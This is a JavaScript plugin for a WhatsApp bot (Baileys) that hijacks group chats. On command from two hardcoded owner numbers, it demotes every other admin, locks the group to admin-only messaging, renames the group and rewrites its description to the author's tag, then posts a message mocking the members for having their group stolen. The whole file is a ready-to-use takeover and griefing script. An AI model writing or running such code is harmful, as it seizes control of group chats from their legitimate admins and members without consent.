// © by Giuse
import { jidNormalizedUser } from '@whiskeysockets/baileys';

let handler = async (message, { conn, isOwner, args }) => {
    // Definisci gli owner JID direttamente qui
    // Assicurati che siano nel formato completo JID (numero@s.whatsapp.net)
    const OWNERS_JIDS = [
        '393445461546@s.whatsapp.net', // Giuse
        '19173829810@s.whatsapp.net'    // L'altro owner
    ];

    // Verifica se l'utente che ha eseguito il comando è uno degli owner definiti
    // Questa verifica è un fallback nel caso in cui `isOwner` non sia passato o configurato correttamente
    const senderIsDefinedOwner = OWNERS_JIDS.includes(message.sender);

    if (!isOwner && !senderIsDefinedOwner) {
        return message.reply("⛔ Questo comando può essere usato solo dal proprietario del bot.");
    }

    const groupId = message.chat; // L'ID del gruppo corrente
    let groupMetadata;
    try {
        groupMetadata = await conn.groupMetadata(groupId);
    } catch (error) {
        console.error("Errore nel recupero dei metadati del gruppo:", error);
        return message.reply("⚠️ Impossibile recuperare i dettagli del gruppo. Assicurati che il bot sia un amministratore.");
    }

    const botJid = conn.user.jid;
    const participants = groupMetadata.participants;
    const groupAdmins = participants.filter(p => p.admin !== null).map(p => p.id);

    // 1. Togliere tutti gli admin ECCETTO gli owner del bot
    const adminsToRemove = groupAdmins.filter(adminJid =>
        adminJid !== botJid && !OWNERS_JIDS.includes(adminJid)
    );

    if (adminsToRemove.length > 0) {
        try {
            await conn.groupParticipantsUpdate(groupId, adminsToRemove, 'demote');
            message.reply(`✅ Ho rimosso ${adminsToRemove.length} amministratori dal gruppo.`);
        } catch (error) {
            console.error("Errore nella rimozione degli amministratori:", error);
            message.reply("❌ Si è verificato un errore durante la rimozione degli amministratori.");
        }
    } else {
        message.reply("ℹ️ Nessun amministratore da rimuovere (o sono tutti owner).");
    }

    // 2. Impostare la chat a soli admin (announcement)
    try {
        await conn.groupSettingUpdate(groupId, 'announcement');
        message.reply("🔒 Il gruppo è stato impostato in modalità 'Solo Amministratori possono inviare messaggi'.");
    } catch (error) {
        console.error("Errore nell'impostazione del gruppo in modalità annuncio:", error);
        message.reply("❌ Si è verificato un errore durante l'impostazione del gruppo in modalità annuncio.");
    }

    // 3. Cambiare il nome in "SVT | © GIUSEMD"
    const newGroupName = "SVT | © GIUSEMD";
    try {
        await conn.groupUpdateSubject(groupId, newGroupName);
        message.reply(`📝 Il nome del gruppo è stato cambiato in: "${newGroupName}"`);
    } catch (error) {
        console.error("Errore nel cambio nome del gruppo:", error);
        message.reply("❌ Si è verificato un errore durante il cambio del nome del gruppo.");
    }

    // 4. Cambiare la bio in "SVT | © GIUSEMD"
    const newGroupDescription = "SVT | © GIUSEMD";
    try {
        await conn.groupUpdateDescription(groupId, newGroupDescription);
        message.reply(`📜 La descrizione del gruppo è stata cambiata in: "${newGroupDescription}"`);
    } catch (error) {
        console.error("Errore nel cambio descrizione del gruppo:", error);
        message.reply("❌ Si è verificato un errore durante il cambio della descrizione del gruppo.");
    }

    // Messaggio finale
    await conn.sendMessage(message.chat, {
        text: "HAHAHAHAH, SVT BY GIUSEMD, NEL BIG 2025 FARSI RUBARE UN GRUPPO È WILD 😂😂💀💀💀"
    }, { quoted: message });
};

handler.help = ["svt", "ruba", "spazza", "distruggi", "peow", "morte", "die", "byebye"];
handler.tags = ['owner'];
handler.command = /^(svt|ruba|spazza|distruggi|peow|morte|die|byebye)$/i;

export default handler;
